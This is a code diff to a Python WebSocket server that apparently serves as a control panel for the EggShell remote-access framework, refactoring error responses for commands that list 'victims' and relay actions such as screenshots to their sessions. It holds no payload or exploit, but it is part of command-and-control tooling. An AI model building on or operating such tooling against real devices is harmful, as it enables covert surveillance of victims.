@@ -132,21 +132,16 @@ class WsServer:
                     else:
                         content = None
                 except:
-                    response["status"] = "Fail"
-                    response["content_type"] = "text"
-                    response["content"] = "Invalid Request"
-                    self.send_data(conn, json.dumps(response))
+                    self.error_res(conn, "Invalid Request")
                     continue
 
                 if command not in self.command_list:
-                    response["status"] = "Fail"
-                    response["content_type"] = "text"
-                    response["content"] = "Invalid Command or Type"
-                    self.send_data(conn, json.dumps(response))
+                    self.error_res(conn, "Invalid Command or Type")
                     continue
 
                 if command == 'close':
                     self.close_app()
+                    sys.exit()
                 if command == 'exit':
                     break
                 elif command == 'fetch':
@@ -156,13 +151,16 @@ class WsServer:
                         self.update_victim_info(conn)
                     elif victims_type == 'identified victims':
                         self.update_identified_victim(conn)
+                    else:
+                        self.error_res(conn, "Invalid victims type")
                 elif command == 'execution':
-                    if not content:
-                        response["status"] = "Fail"
-                        response["content_type"] = "text"
-                        response["content"] = "Invalid Action Command"
-                    response = self.run_command(content)
-                    self.send_data(conn, json.dumps(response))
+                    if content:
+                        try:
+                            self.run_command(conn, content)
+                        except:
+                            self.error_res(conn, "Error in Execution")
+                    else:
+                        self.error_res(conn, "Invalid Action Command")
 
         conn.sendall(b'End Connection')
         self.conn_poll.remove(conn)
@@ -171,6 +169,7 @@ class WsServer:
 
 ### Server Functions
 
+    # close this Application Server
     def close_app(self):
         self.is_running = False
         time.sleep(3)
@@ -185,27 +184,29 @@ class WsServer:
             self.conn_poll.remove(conn)
             conn.close()
 
-
+    # Return error message to client
+    def error_res(self, conn, err_msg):
+        response = {}
+        response["status"] = "Fail"
+        response["content_type"] = "text"
+        response["content"] = err_msg
+        self.send_data(conn, json.dumps(response))
 
     # Execute command from clients' request
-    def run_command(self, content):
+    def run_command(self, conn, content):
         response = {}
 
         if not content:
-            response["status"] = "Fail"
-            response["content_type"] = "text"
-            response["content"] = "Invalid Content"
-            return response
+            self.error_res(conn, "Invalid Content")
+            return
 
         try:
             session_id = content['session_id']
             action = content['action']
             para = content['para']
         except:
-            response["status"] = "Fail"
-            response["content_type"] = "text"
-            response["content"] = "Invalid Content Format"
-            return response
+            self.error_res(conn, "Invalid Content Format")
+            return
 
         if not para:
             cmd_data = action + ' ' + para
@@ -218,25 +219,21 @@ class WsServer:
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
+                self.send_data(conn, json.dumps(response))
             else:
-                response["status"] = "Fail"
-                response["content_type"] = "text"
-                response["content"] = "Error in Execution"
+                self.error_res(conn, "Error in Execution")
         elif action == 'screenshot':
             filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
             if filename:
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
+                self.send_data(conn, json.dumps(response))
             else:
-                response["status"] = "Fail"
-                response["content_type"] = "text"
-                response["content"] = "Error in Execution"
+                self.error_res(conn, "Error in Execution")
         else:
-            response["status"] = "Fail"
-            response["content_type"] = "text"
-            response["content"] = "Invalid Action"
-        return response
+            self.error_res(conn, "Invalid Action")
+        return
 
     # Auto push victims' info when the victims' info is modified in server
     def push_data(self):
